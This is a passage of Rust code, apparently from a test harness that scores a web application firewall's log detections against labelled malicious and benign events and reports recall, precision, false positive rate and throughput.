        match record.expected.class {
            TruthClass::Malicious
                if !expected_rules.is_empty() && expected_rules.is_subset(&actual_rules) =>
            {
                metrics.true_positives += 1
            }
            TruthClass::Malicious if !expected_rules.is_empty() => metrics.false_negatives += 1,
            TruthClass::Benign if actual_rules.is_empty() => metrics.true_negatives += 1,
            TruthClass::Benign => metrics.false_positives += 1,
            _ => {}
        }
    }
    let recall = ratio(
        metrics.true_positives,
        metrics.true_positives + metrics.false_negatives,
    );
    let precision = ratio(
        metrics.true_positives,
        metrics.true_positives + metrics.false_positives,
    );
    let false_positive_rate = ratio(
        metrics.false_positives,
        metrics.false_positives + metrics.true_negatives,
    );
    Ok(ValidationReport {
        status: if failures.is_empty() {
            "PASS".to_owned()
        } else {
            "FAIL".to_owned()
        },
        metrics,
        recall,
        precision,
        false_positive_rate,
        failures,
    })
}

fn read_truth(path: &Path) -> Result<BTreeMap<String, TruthRecord>> {
    let file = File::open(path).with_context(|| format!("opening {}", path.display()))?;
    let mut records = BTreeMap::new();
    for line in BufReader::new(file).lines() {
        let record: TruthRecord = serde_json::from_str(&line?)?;
        records.insert(record.event_id.clone(), record);
    }
    Ok(records)
}
fn read_manifest(path: &Path) -> Result<Manifest> {
    Ok(serde_json::from_reader(
        File::open(path).with_context(|| format!("opening {}", path.display()))?,
    )?)
}
fn ratio(numerator: usize, denominator: usize) -> Option<f64> {
    (denominator != 0).then(|| numerator as f64 / denominator as f64)
}

pub fn measure(corpus: &Path) -> Result<(usize, u64, f64)> {
    let started = Instant::now();
    let bytes = std::fs::metadata(corpus)?.len();
    let compressed = corpus
        .extension()
        .and_then(|value| value.to_str())
        .is_some_and(|value| value.eq_ignore_ascii_case("gz"));
    let reader = maybe_gzip_reader(File::open(corpus)?, compressed);
    let events = WafLines::new(reader).filter(Result::is_ok).count();
    Ok((events, bytes, started.elapsed().as_secs_f64()))
}
